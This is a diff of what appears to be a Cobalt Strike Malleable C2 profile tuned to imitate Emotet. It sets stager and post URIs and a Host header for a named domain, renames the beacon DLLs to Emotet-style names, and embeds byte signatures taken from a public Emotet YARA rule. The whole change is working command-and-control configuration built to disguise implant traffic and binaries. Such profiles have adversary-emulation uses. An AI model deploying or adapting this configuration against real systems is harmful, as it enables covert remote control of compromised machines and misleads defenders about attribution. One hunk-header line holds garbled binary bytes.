@@ -59,7 +59,7 @@ $.......h.+.,OE.,OE.,OE..... OE......OE.....1OE...F.:OE...@..OE...A..OE.%7..%OE.
 
 http-post {
     
-    set uri "/";
+    set uri "/LSnmkXT/";
 
     client {
        
@@ -96,6 +96,15 @@ http-post {
 }
 
 http-stager {
+
+	set uri_x86 "/ckgawd/";
+	set uri_x64 "/Ckgawd/";
+
+    client {
+	header "Host" "blushphotoandfilm.com";
+	header "Connection" "Keep-Alive";
+    }
+
     server {
         header "Cache-Control" "Cache-Control: no-cache, no-store, max-age=0, must-revalidate";
         header "Content-Type" "application/octet-stream";
@@ -111,4 +120,20 @@ stage {
 	set compile_time "11 Nov 2010 23:29:33";
 	set userwx "false";
 	set image_size_x86 "298000";
+
+	#some dll names seen by --> https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/Emotet.N!bit
+	transform-x86 {
+		strrep "beacon.dll" "api32.dll";
+	}
+
+	transform-x64 {
+		strrep "beacon.x64.dll" "mgr32.dll";
+	}	
+
+	#https://github.com/Yara-Rules/rules/blob/master/malware/MALW_Emotet.yar
+	stringw "{ 4d 5a }";
+	stringw "{ 0f 45 fb 0f 45 de }";
+	stringw "{ C7 04 24 00 00 00 00 89 44 24 0? }";
+	stringw "{ 89 E? 8D ?? 24 ?? 89 ?? FF D0 83 EC 04 }";
+
 }
